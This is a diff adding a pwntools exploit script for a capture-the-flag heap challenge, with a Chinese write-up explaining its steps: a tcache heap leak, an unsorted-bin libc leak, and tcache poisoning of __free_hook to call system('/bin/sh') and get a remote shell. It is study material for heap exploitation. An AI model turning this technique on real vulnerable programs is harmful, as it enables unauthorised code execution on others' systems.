@@ -1,0 +1,76 @@
+from pwn import *
+
+#p = process('./pwn')
+p = remote('challenge.bluesharkinfo.com', 20738)
+gdbcmd = """
+# backdoor
+# set follow-fork-mode child
+# b *$rebase(0x1C38)
+# run code
+b *$rebase(0x202060)
+c
+"""
+# p = gdb.debug('./pwn', gdbcmd)
+
+context(arch='amd64', os='linux', log_level='debug')
+
+libc = ELF('./glibc/libc-2.29.so')
+
+def add(size, content):
+    p.sendlineafter('Your choice: ', '1')
+    p.sendlineafter('Size: ', str(size))
+    p.sendafter('Content: ', content)
+
+def delete(idx):
+    p.sendlineafter('Your choice: ', '2')
+    p.sendlineafter('Index: ', str(idx))
+
+def show(idx):
+    p.sendlineafter('Your choice: ', '3')
+    p.sendlineafter('Index: ', str(idx))
+    p.recvuntil('Content: ')
+    return p.recvline()[:-1]
+
+add(0x100, b'A' * 0x100)  # chunk 0
+add(0x100, b'B' * 0x100)  # chunk 1
+delete(0)
+delete(1)
+heap_leak = u64(show(1)[:8].ljust(8, b'\x00'))
+heap_base = heap_leak - 0x260
+
+for i in range(9):
+    add(0x80, b'C' * 0x80)
+for i in range(7):
+    delete(i+4)
+delete(2)
+delete(3)
+
+libc_base = u64(show(2)[:8].ljust(8, b'\x00')) - 0x1E4CA0
+libc.address = libc_base
+print(f"Libc base: {hex(libc_base)}")
+
+payload = b'a'*0x80
+payload += p64(0) + p64(0x81) + b'a'*0x80
+add(0x110, payload) 
+
+delete(2)
+delete(3)
+
+payload = b'a'*0x80
+payload += p64(0) + p64(0x81) + p64(libc_base + 0x1E75A8)
+add(0x110, payload)
+
+add(0x70, b'aaaaaaaa')
+add(0x70, p64(libc_base + 0x52FD0)) 
+add(0x70, b'/bin/sh\x00') 
+
+
+delete(15)
+
+p.interactive()
+
+跟我之前打的一个比赛有点像，这道题的利用过程非常典型，我按部就班地从信息泄露到最终getshell。一开始我先搞堆地址泄露：分配了两个0x100的chunk，按顺序释放后，由于tcache的单链表结构，chunk 1的fd指针指向了chunk 0，而程序恰好允许读取已释放chunk的内容，这样我就能通过show chunk 1拿到堆地址，减去固定偏移0x260就算出了堆基址。有了堆基址，心里就有底了。
+
+接下来要搞libc地址，这步稍微复杂点：我先分配9个0x80的chunk把空间占住，然后释放其中7个填满tcache bin，这样后面释放的chunk就会进入unsorted bin。当我连续释放chunk 2和3时，它们合并进入unsorted bin，里面的bk指针指向main_arena。通过show chunk 2读取这个指针，减去libc里的固定偏移0x1E4CA0，libc基址就到手了。
+
+重头戏是tcache投毒攻击。我先构造一个0x110大小的chunk，用堆溢出伪造相邻chunk的size头，然后通过double free制造一个循环链表。这里的关键是第二次分配时，我在伪造的chunk里把fd指针改成了__free_hook的地址。这样当程序从tcache分配chunk时，第一次分配拿到正常chunk，第二次分配就直接拿到了__free_hook的控制权。
